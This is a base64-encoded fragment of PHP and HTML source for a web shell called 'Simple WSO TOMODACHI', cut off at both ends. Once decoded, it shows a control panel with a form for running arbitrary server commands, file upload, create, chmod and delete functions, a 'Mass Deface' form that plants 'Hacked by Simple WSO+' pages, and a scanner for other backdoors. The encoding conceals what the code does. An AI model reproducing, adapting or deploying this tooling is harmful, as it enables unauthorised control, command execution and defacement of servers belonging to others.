WxzZSkgY29udGludWU7DQoNCiAgICAgICAgJG1hdGNoZWRfcGF0dGVybnMgPSBbXTsNCiAgICAgICAgZm9yZWFjaCAoJHBhdHRlcm5zIGFzICRsYWJlbCA9PiAkcGF0dGVybikgew0KICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJHBhdHRlcm4sICRjb250ZW50KSkgew0KICAgICAgICAgICAgICAgICRtYXRjaGVkX3BhdHRlcm5zW10gPSAkbGFiZWw7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFlbXB0eSgkbWF0Y2hlZF9wYXR0ZXJucykpIHsNCiAgICAgICAgICAgICRyZWxfcGF0aCA9IHN0cl9yZXBsYWNlKCRzY2FuX3BhdGggLiAnLycsICcnLCAkZmlsZS0+Z2V0UGF0aG5hbWUoKSk7DQogICAgICAgICAgICAkc2Nhbl9yZXN1bHRzW10gPSBbDQogICAgICAgICAgICAgICAgJ2ZpbGUnID0+ICRyZWxfcGF0aCwNCiAgICAgICAgICAgICAgICAnc2l6ZScgPT4gcm91bmQoJGZpbGUtPmdldFNpemUoKS8xMDI0LDEpIC4gJyBLQicsDQogICAgICAgICAgICAgICAgJ2NvdW50JyA9PiBjb3VudCgkbWF0Y2hlZF9wYXR0ZXJucyksDQogICAgICAgICAgICAgICAgJ3BhdHRlcm5zJyA9PiBpbXBsb2RlKCcsICcsICRtYXRjaGVkX3BhdHRlcm5zKQ0KICAgICAgICAgICAgXTsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KLy8gPT09IEdFVCBQRVJNSVNTSU9OIFNUUklORyA9PT0NCmZ1bmN0aW9uIGdldFBlcm1zU3RyaW5nKCRmaWxlUGF0aCkgew0KICAgICRwZXJtcyA9IGZpbGVwZXJtcygkZmlsZVBhdGgpOw0KICAgICRpbmZvID0gJyc7DQogICAgaWYgKCgkcGVybXMgJiAweEYwMDApID09IDB4QzAwMCkgJGluZm8gPSAncyc7DQogICAgZWxzZWlmICgoJHBlcm1zICYgMHhGMDAwKSA9PSAweEEwMDApICRpbmZvID0gJ2wnOw0KICAgIGVsc2VpZiAoKCRwZXJtcyAmIDB4RjAwMCkgPT0gMHg4MDAwKSAkaW5mbyA9ICctJzsNCiAgICBlbHNlaWYgKCgkcGVybXMgJiAweEYwMDApID09IDB4NDAwMCkgJGluZm8gPSAnZCc7DQogICAgZWxzZWlmICgoJHBlcm1zICYgMHhGMDAwKSA9PSAweDYwMDApICRpbmZvID0gJ2InOw0KICAgIGVsc2VpZiAoKCRwZXJtcyAmIDB4RjAwMCkgPT0gMHgyMDAwKSAkaW5mbyA9ICdjJzsNCiAgICBlbHNlaWYgKCgkcGVybXMgJiAweEYwMDApID09IDB4MTAwMCkgJGluZm8gPSAncCc7DQogICAgZWxzZSAkaW5mbyA9ICd1JzsNCg0KICAgICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMTAwKSA/ICdyJyA6ICctJyk7DQogICAgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwODApID8gJ3cnIDogJy0nKTsNCiAgICAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDA0MCkgPyAoKCRwZXJtcyAmIDB4MDgwMCkgPyAncycgOiAneCcpIDogKCgkcGVybXMgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7DQoNCiAgICAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAyMCkgPyAncicgOiAnLScpOw0KICAgICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDEwKSA/ICd3JyA6ICctJyk7DQogICAgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDgpID8gKCgkcGVybXMgJiAweDA0MDApID8gJ3MnIDogJ3gnKSA6ICgoJHBlcm1zICYgMHgwNDAwKSA/ICdTJyA6ICctJykpOw0KDQogICAgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDQpID8gJ3InIDogJy0nKTsNCiAgICAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwMikgPyAndycgOiAnLScpOw0KICAgICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDAxKSA/ICgoJHBlcm1zICYgMHgwMjAwKSA/ICd0JyA6ICd4JykgOiAoKCRwZXJtcyAmIDB4MDIwMCkgPyAnVCcgOiAnLScpKTsNCg0KICAgIHJldHVybiAkaW5mbzsNCn0NCg0Kc2hvd191aToNCj8+DQo8aHRtbD4NCjxoZWFkPg0KICAgIDx0aXRsZT5TaW1wbGUgV1NPIFRPTU9EQUNISTwvdGl0bGU+DQogICAgPHN0eWxlPg0KICAgICAgICBib2R5IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDAgdXJsKCdodHRwczovL2kuZ2lmZXIuY29tLzFrdEMuZ2lmJykgY2VudGVyIGNlbnRlciBmaXhlZDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogICAgICAgICAgICBjb2xvcjogPD9waHAgZWNobyAkY29sb3I7ID8+Ow0KICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdDb3VyaWVyIE5ldycsIG1vbm9zcGFjZTsNCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTRweDsNCiAgICAgICAgICAgIG1hcmdpbjogMDsNCiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHg7DQogICAgICAgICAgICBtaW4taGVpZ2h0OiAxMDB2aDsNCiAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCiAgICAgICAgfQ0KICAgICAgICBib2R5OjphZnRlciB7DQogICAgICAgICAgICBjb250ZW50OiAiIjsNCiAgICAgICAgICAgIHBvc2l0aW9uOiBmaXhlZDsNCiAgICAgICAgICAgIHRvcDogMDsgbGVmdDogMDsgcmlnaHQ6IDA7IGJvdHRvbTogMDsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJhZGlhbC1ncmFkaWVudChjaXJjbGUsIHJnYmEoMCwxMCwxNSwwLjcpIDAlLCByZ2JhKDAsMCwwLDAuOSkgMTAwJSk7DQogICAgICAgICAgICB6LWluZGV4OiAtMTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlucHV0LCB0ZXh0YXJlYSwgc2VsZWN0IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjAsIDIwLCAyMCwgMC45KTsNCiAgICAgICAgICAgIGNvbG9yOiA8P3BocCBlY2hvICRjb2xvcjsgPz47DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCA8P3BocCBlY2hvICRjb2xvcjsgPz47DQogICAgICAgICAgICBwYWRkaW5nOiA2cHg7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7DQogICAgICAgIH0NCg0KICAgICAgICBhIHsNCiAgICAgICAgICAgIGNvbG9yOiA8P3BocCBlY2hvICRjb2xvcjsgPz47DQogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQogICAgICAgICAgICB0cmFuc2l0aW9uOiBjb2xvciAwLjNzOw0KICAgICAgICB9DQogICAgICAgIGE6aG92ZXIgeyBjb2xvcjogI2ZmZmZmZjsgfQ0KDQogICAgICAgIHRhYmxlIHsNCiAgICAgICAgICAgIGJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7DQogICAgICAgICAgICBtYXJnaW4tdG9wOiAxMHB4Ow0KICAgICAgICAgICAgd2lkdGg6IDEwMCU7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDEwLCAxMCwgMTAsIDAuNyk7DQogICAgICAgIH0NCiAgICAgICAgdGQsIHRoIHsNCiAgICAgICAgICAgIHBhZGRpbmc6IDhweCAxMHB4Ow0KICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGxlZnQ7DQogICAgICAgIH0NCg0KICAgICAgICAvKiBBTklNQVNJIEhFQURFUiBUQUJFTCAqLw0KICAgICAgICB0aCB7DQogICAgICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlOw0KICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgICAgICAgICAgY3Vyc29yOiBkZWZhdWx0Ow0KICAgICAgICB9DQogICAgICAgIHRoOmhvdmVyIHsNCiAgICAgICAgICAgIGNvbG9yOiB5ZWxsb3c7DQogICAgICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDEuMDUpOw0KICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDAgMCA4cHggeWVsbG93Ow0KICAgICAgICB9DQoNCiAgICAgICAgLmFjdGlvbiB7IHdoaXRlLXNwYWNlOiBub3dyYXA7IGZvbnQtc2l6ZTogMTNweDsgfQ0KICAgICAgICAubXNnIHsNCiAgICAgICAgICAgIGNvbG9yOiB5ZWxsb3c7DQogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsNCiAgICAgICAgICAgIG1hcmdpbjogMTVweCAwOw0KICAgICAgICAgICAgcGFkZGluZzogMTBweDsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMzAsIDMwLCAwLCAwLjUpOw0KICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNHB4Ow0KICAgICAgICB9DQogICAgICAgIC5wYXRoLWJhciB7DQogICAgICAgICAgICBtYXJnaW46IDEycHggMDsNCiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHg7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDIwLCAyMCwgMjAsIDAuOCk7DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCA8P3BocCBlY2hvICRjb2xvcjsgPz47DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA2cHg7DQogICAgICAgIH0NCg0KICAgICAgICAuYnRuIHsNCiAgICAgICAgICAgIG1hcmdpbjogNHB4IDJweDsNCiAgICAgICAgICAgIHBhZGRpbmc6IDhweCAxNnB4Ow0KICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSg0MCwgNDAsIDQwLCAwLjkpOw0KICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgPD9waHAgZWNobyAkY29sb3I7ID8+Ow0KICAgICAgICAgICAgY29sb3I6IDw/cGhwIGVjaG8gJGNvbG9yOyA/PjsNCiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4Ow0KICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuM3MgZWFzZTsNCiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgMnB4IDVweCByZ2JhKDAsMCwwLDAuMyk7DQogICAgICAgIH0NCiAgICAgICAgLmJ0bjpob3ZlciB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDYwLCA2MCwgNjAsIDEpOw0KICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0ycHgpOw0KICAgICAgICAgICAgYm94LXNoYWRvdzogMCA0cHggOHB4IHJnYmEoMCwyNTUsMTUzLDAuMik7DQogICAgICAgIH0NCiAgICAgICAgLmJ0bjphY3RpdmUgeyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCk7IH0NCiAgICAgICAgLmJ0bi1yZWQgeyBib3JkZXItY29sb3I6ICNmZjY2NjY7IGNvbG9yOiAjZmY2NjY2OyB9DQogICAgICAgIC5idG4tcmVkOmhvdmVyIHsgYmFja2dyb3VuZDogcmdiYSg4MCwgMjAsIDIwLCAwLjkpOyB9DQogICAgICAgIC5idG4tZ3JlZW4geyBib3JkZXItY29sb3I6ICM2NmZmNjY7IGNvbG9yOiAjNjZmZjY2OyB9DQogICAgICAgIC5idG4tZ3JlZW46aG92ZXIgeyBiYWNrZ3JvdW5kOiByZ2JhKDIwLCA4MCwgMjAsIDAuOSk7IH0NCiAgICAgICAgLmJ0bi1ibHVlIHsgYm9yZGVyLWNvbG9yOiAjNjY5OWZmOyBjb2xvcjogIzY2OTlmZjsgfQ0KICAgICAgICAuYnRuLWJsdWU6aG92ZXIgeyBiYWNrZ3JvdW5kOiByZ2JhKDIwLCA0MCwgODAsIDAuOSk7IH0NCiAgICAgICAgLmJ0bi1wdXJwbGUgeyBib3JkZXItY29sb3I6ICNjYzY2ZmY7IGNvbG9yOiAjY2M2NmZmOyB9DQogICAgICAgIC5idG4tcHVycGxlOmhvdmVyIHsgYmFja2dyb3VuZDogcmdiYSg2MCwgMjAsIDgwLCAwLjkpOyB9DQogICAgICAgIC5idG4taG9tZSB7IGJvcmRlci1jb2xvcjogIzY2Y2NjYzsgY29sb3I6ICM2NmNjY2M7IH0NCiAgICAgICAgLmJ0bi1ob21lOmhvdmVyIHsgYmFja2dyb3VuZDogcmdiYSgyMCwgNjAsIDYwLCAwLjkpOyB9DQoNCiAgICAgICAgLyogQlVUVE9OIENSRUFURSBGSUxFL0ZPTERFUiAtIENSSU1TT04gKi8NCiAgICAgICAgLmJ0bi1jcmltc29uIHsNCiAgICAgICAgICAgIGJvcmRlci1jb2xvcjogI2RjMTQzYyAhaW1wb3J0YW50Ow0KICAgICAgICAgICAgY29sb3I6ICNmZjk5OTkgIWltcG9ydGFudDsNCiAgICAgICAgfQ0KICAgICAgICAuYnRuLWNyaW1zb246aG92ZXIgew0KICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgxMDAsIDEwLCA0MCwgMC45KSAhaW1wb3J0YW50Ow0KICAgICAgICAgICAgYm94LXNoYWRvdzogMCA0cHggOHB4IHJnYmEoMjIwLCAyMCwgNjAsIDAuMykgIWltcG9ydGFudDsNCiAgICAgICAgfQ0KDQogICAgICAgIC8qIEFDVElPTlMgLSBCVVRUT04gS0VSRU4gKi8NCiAgICAgICAgLmFjdGlvbi1idG4gew0KICAgICAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOw0KICAgICAgICAgICAgbWFyZ2luOiAycHg7DQogICAgICAgICAgICBwYWRkaW5nOiAzcHggOHB4Ow0KICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNHB4Ow0KICAgICAgICAgICAgZm9udC1zaXplOiAxMnB4Ow0KICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuMnM7DQogICAgICAgIH0NCiAgICAgICAgLmFjdGlvbi12aWV3IHsgYmFja2dyb3VuZDogIzFhM2MxYTsgYm9yZGVyOiAxcHggc29saWQgIzMzZmYzMzsgY29sb3I6ICNhYWZmYWE7IH0NCiAgICAgICAgLmFjdGlvbi1lZGl0IHsgYmFja2dyb3VuZDogIzNjM2MxYTsgYm9yZGVyOiAxcHggc29saWQgI2ZmZmYzMzsgY29sb3I6ICNmZmZmYWE7IH0NCiAgICAgICAgLmFjdGlvbi1yZW5hbWUgeyBiYWNrZ3JvdW5kOiAjMWEyYTNjOyBib3JkZXI6IDFweCBzb2xpZCAjMzM5OWZmOyBjb2xvcjogI2FhY2NmZjsgfQ0KICAgICAgICAuYWN0aW9uLWNobW9kIHsgYmFja2dyb3VuZDogIzNjMWEzYzsgYm9yZGVyOiAxcHggc29saWQgI2NjMzNjYzsgY29sb3I6ICNmZjk5ZmY7IH0NCiAgICAgICAgLmFjdGlvbi1kZWxldGUgeyBiYWNrZ3JvdW5kOiAjM2MxYTFhOyBib3JkZXI6IDFweCBzb2xpZCAjZmYzMzMzOyBjb2xvcjogI2ZmOTk5OTsgfQ0KICAgICAgICAuYWN0aW9uLWJ0bjpob3ZlciB7DQogICAgICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDEuMSk7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgNnB4IGN1cnJlbnRDb2xvcjsNCiAgICAgICAgfQ0KDQogICAgICAgIC5zY2FuLXJlc3VsdCB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDMwLCAzMCwgMzAsIDAuOCk7DQogICAgICAgICAgICBwYWRkaW5nOiAxNXB4Ow0KICAgICAgICAgICAgbWFyZ2luOiAxNXB4IDA7DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCBvcmFuZ2U7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA2cHg7DQogICAgICAgIH0NCiAgICAgICAgLm5ldy1maWxlIHsNCiAgICAgICAgICAgIGNvbG9yOiAjZmY5OTk5Ow0KICAgICAgICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQogICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXI7DQogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsNCiAgICAgICAgfQ0KICAgICAgICAuZm9ybS1ib3ggew0KICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyMCwgMjAsIDIwLCAwLjgpOw0KICAgICAgICAgICAgcGFkZGluZzogMTVweDsNCiAgICAgICAgICAgIG1hcmdpbjogMTVweCAwOw0KICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzQ0NDsNCiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA2cHg7DQogICAgICAgIH0NCiAgICAgICAgI2RlZmFjZUJveCwgI2NyZWF0ZUZpbGVCb3gsICNjcmVhdGVGb2xkZXJCb3gsICNoaXN0b3J5Qm94IHsNCiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7DQogICAgICAgIH0NCiAgICAgICAgI2hpc3RvcnlDb250ZW50IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDA7DQogICAgICAgICAgICBjb2xvcjogIzBmMDsNCiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHg7DQogICAgICAgICAgICBoZWlnaHQ6IDI1MHB4Ow0KICAgICAgICAgICAgb3ZlcmZsb3cteTogYXV0bzsNCiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMwZjA7DQogICAgICAgICAgICBmb250LWZhbWlseTogbW9ub3NwYWNlOw0KICAgICAgICAgICAgd2hpdGUtc3BhY2U6IHByZS13cmFwOw0KICAgICAgICB9DQogICAgPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8aDIgc3R5bGU9ImNvbG9yOiMwMGZmY2M7Ij5UT01PREFDSEkgU2ltcGxlIFdTTyANCiAgICA8YSBocmVmPSI/cGF0aD08P3BocCBlY2hvIHVybGVuY29kZShkaXJuYW1lKF9fRklMRV9fKSk7IGVjaG8gJGF1dGhfYXBwZW5kOyA/PiIgY2xhc3M9ImJ0biBidG4taG9tZSI+SE9NRTwvYT4NCiAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tYmx1ZSIgb25jbGljaz0ic2hvd0hpc3RvcnkoKSI+SGlzdG9yeTwvYnV0dG9uPg0KPC9oMj4NCjw/cGhwIGlmICghZW1wdHkoJG1zZykpIGVjaG8gIjxwIGNsYXNzPSdtc2cnPiRtc2c8L3A+IjsgPz4NCg0KPHA+PGI+VW5hbWU6PC9iPiA8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHVuYW1lKTsgPz48L3A+DQoNCjw/cGhwDQokY3VycmVudFBlcm0gPSBnZXRQZXJtc1N0cmluZygkcHdkKTsNCj8+DQo8ZGl2IGNsYXNzPSJwYXRoLWJhciI+DQogICAgPGI+UGF0aDo8L2I+IA0KICAgIDw/cGhwDQogICAgJHBhdGhQYXJ0cyA9IGV4cGxvZGUoJy8nLCB0cmltKCRwd2QsICcvJykpOw0KICAgIGVjaG8gJzxhIGhyZWY9Ij9wYXRoPS8nIC4gJGF1dGhfYXBwZW5kIC4gJyI+LzwvYT4nOw0KICAgICRjdW11bGF0aXZlID0gJyc7DQogICAgZm9yZWFjaCAoJHBhdGhQYXJ0cyBhcyAkcGFydCkgew0KICAgICAgICBpZiAoJHBhcnQgPT09ICcnKSBjb250aW51ZTsNCiAgICAgICAgJGN1bXVsYXRpdmUgLj0gJy8nIC4gJHBhcnQ7DQogICAgICAgIGVjaG8gJyA8YSBocmVmPSI/cGF0aD0nIC4gdXJsZW5jb2RlKCRjdW11bGF0aXZlKSAuICRhdXRoX2FwcGVuZCAuICciPi8nIC4gaHRtbHNwZWNpYWxjaGFycygkcGFydCkgLiAnPC9hPic7DQogICAgfQ0KICAgID8+DQogICAgPHNwYW4gc3R5bGU9ImNvbG9yOmdyYXk7IG1hcmdpbi1sZWZ0OjE1cHg7Ij48P3BocCBlY2hvICRjdXJyZW50UGVybTsgPz48L3NwYW4+DQogICAgPGEgaHJlZj0iIyIgb25jbGljaz0iY2htb2RQYXRoKCc8P3BocCBlY2hvIGFkZHNsYXNoZXMoaHRtbHNwZWNpYWxjaGFycygkcHdkLCBFTlRfUVVPVEVTKSk7ID8+Jyk7IHJldHVybiBmYWxzZTsiIHN0eWxlPSJtYXJnaW4tbGVmdDoxNXB4OyIgY2xhc3M9ImJ0biI+Q2htb2QgRGlyPC9hPg0KPC9kaXY+DQoNCjwhLS0gQ29tbWFuZCBFeGVjIC0tPg0KPGZvcm0gbWV0aG9kPSJwb3N0IiBzdHlsZT0ibWFyZ2luOjE1cHggMDsiPg0KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImF1dGgiIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHNlY3JldF9hdXRoKTsgPz4iPg0KICAgIDx0ZXh0YXJlYSBuYW1lPSJjbWQiIHJvd3M9IjIiIGNvbHM9IjgwIiBwbGFjZWhvbGRlcj0iZS5nLiBscyAtbGEsIHdob2FtaSI+PC90ZXh0YXJlYT48YnI+PGJyPg0KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIENvbW1hbmQiIGNsYXNzPSJidG4iPg0KPC9mb3JtPg0KDQo8IS0tIENyZWF0ZSBGaWxlIC8gRm9sZGVyIEJ1dHRvbnMgKENSSU1TT04pIC0tPg0KPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4gYnRuLWNyaW1zb24iIG9uY2xpY2s9InRvZ2dsZUNyZWF0ZUZpbGUoKSI+Q3JlYXRlIEZpbGU8L2J1dHRvbj4NCjxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1jcmltc29uIiBvbmNsaWNrPSJ0b2dnbGVDcmVhdGVGb2xkZXIoKSI+Q3JlYXRlIEZvbGRlcjwvYnV0dG9uPg0KDQo8IS0tIENyZWF0ZSBGaWxlIEZvcm0gLS0+DQo8ZGl2IGlkPSJjcmVhdGVGaWxlQm94IiBjbGFzcz0iZm9ybS1ib3giPg0KICAgIDxoMz5DcmVhdGUgTmV3IEZpbGU8L2gzPg0KICAgIDxmb3JtIG1ldGhvZD0icG9zdCI+DQogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImF1dGgiIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHNlY3JldF9hdXRoKTsgPz4iPg0KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZW5hbWUiIHBsYWNlaG9sZGVyPSJlLmcuIG5ld2ZpbGUucGhwIiBzdHlsZT0id2lkdGg6MzAwcHg7Ij48YnI+PGJyPg0KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJjcmVhdGVfZmlsZSIgdmFsdWU9IkNyZWF0ZSBGaWxlIiBjbGFzcz0iYnRuIGJ0bi1jcmltc29uIj4NCiAgICA8L2Zvcm0+DQo8L2Rpdj4NCg0KPCEtLSBDcmVhdGUgRm9sZGVyIEZvcm0gLS0+DQo8ZGl2IGlkPSJjcmVhdGVGb2xkZXJCb3giIGNsYXNzPSJmb3JtLWJveCI+DQogICAgPGgzPkNyZWF0ZSBOZXcgRm9sZGVyPC9oMz4NCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiPg0KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhdXRoIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzZWNyZXRfYXV0aCk7ID8+Ij4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZvbGRlcm5hbWUiIHBsYWNlaG9sZGVyPSJlLmcuIG15Zm9sZGVyIiBzdHlsZT0id2lkdGg6MzAwcHg7Ij48YnI+PGJyPg0KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJjcmVhdGVfZm9sZGVyIiB2YWx1ZT0iQ3JlYXRlIEZvbGRlciIgY2xhc3M9ImJ0biBidG4tY3JpbXNvbiI+DQogICAgPC9mb3JtPg0KPC9kaXY+DQoNCjwhLS0gVXBsb2FkIC0tPg0KPGgzPlVwbG9hZCBGaWxlPC9oMz4NCjxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+DQogICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYXV0aCIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkc2VjcmV0X2F1dGgpOyA/PiI+DQogICAgPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9InVwbG9hZCIgc3R5bGU9IndpZHRoOjMwMHB4Ij4NCiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIiBjbGFzcz0iYnRuIj4NCjwvZm9ybT4NCg0KPCEtLSBNYXNzIERlZmFjZSBCdXR0b24gLS0+DQo8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tcHVycGxlIiBvbmNsaWNrPSJ0b2dnbGVEZWZhY2UoKSI+TWFzcyBEZWZhY2U8L2J1dHRvbj4NCg0KPCEtLSBNYXNzIERlZmFjZSBGb3JtIC0tPg0KPGRpdiBpZD0iZGVmYWNlQm94IiBjbGFzcz0iZm9ybS1ib3giPg0KICAgIDxoMz5NYXNzIERlZmFjZSAtIENyZWF0ZSBTaW5nbGUgRmlsZSBpbiBPbmUgRGlyZWN0b3J5PC9oMz4NCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiPg0KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhdXRoIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzZWNyZXRfYXV0aCk7ID8+Ij4NCiAgICAgICAgPGxhYmVsPkRlZmFjZSBGaWxlbmFtZTo8L2xhYmVsPjxicj4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImRlZmFjZV9maWxlbmFtZSIgdmFsdWU9ImRlZmFjZWQuaHRtbCIgc3R5bGU9IndpZHRoOjMwMHB4OyI+PGJyPjxicj4NCiAgICAgICAgPGxhYmVsPkZpbGUgQ29udGVudDo8L2xhYmVsPjxicj4NCiAgICAgICAgPHRleHRhcmVhIG5hbWU9ImRlZmFjZV9jb250ZW50IiByb3dzPSI2IiBjb2xzPSI2MCIgc3R5bGU9IndpZHRoOjEwMCU7Ij48aDE+SGFja2VkIGJ5IFNpbXBsZSBXU08rPC9oMT48L3RleHRhcmVhPjxicj48YnI+DQogICAgICAgIDxsYWJlbD5UYXJnZXQgRGlyZWN0b3J5IFBhdGg6PC9sYWJlbD48YnI+DQogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkZWZhY2VfcGF0aCIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkcHdkKTsgPz4iIHN0eWxlPSJ3aWR0aDoxMDAlOyBtYXJnaW46NXB4IDA7Ij48YnI+PGJyPg0KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJtYXNzX2RlZmFjZSIgdmFsdWU9IkRlcGxveSBEZWZhY2UgRmlsZSIgY2xhc3M9ImJ0biBidG4tcHVycGxlIj4NCiAgICA8L2Zvcm0+DQo8L2Rpdj4NCg0KPCEtLSBCYWNrZG9vciBTY2FubmVyIC0tPg0KPGJyPg0KPGgzIHN0eWxlPSJjb2xvcjp5ZWxsb3c7Ij5TaGVsbCBCYWNrZG9vciBEZXRlY3RvciAoRGV0YWlsZWQpPC9oMz4NCjxmb3JtIG1ldGhvZD0icG9zdCIgc3R5bGU9Im1hcmdpbjoxMHB4IDA7Ij4NCiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhdXRoIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzZWNyZXRfYXV0aCk7ID8+Ij4NCiAgICA8bGFiZWw+U2NhbiBQYXRoOjwvbGFiZWw+PGJyPg0KICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJzY2FuX3BhdGgiIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHB3ZCk7ID8+IiBzdHlsZT0id2lkdGg6MTAwJTsgbWFyZ2luOjVweCAwOyI+DQogICAgPGJyPg0KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InJ1bl9zY2FuIiB2YWx1ZT0iU2Nhbm5pbmchISEiIGNsYXNzPSJidG4iPg0KPC9mb3JtPg0KPD9waHAgaWYgKCFlbXB0eSgkc2Nhbl9yZXN1bHRzKSk6ID8+DQo8ZGl2IGNsYXNzPSJzY2FuLXJl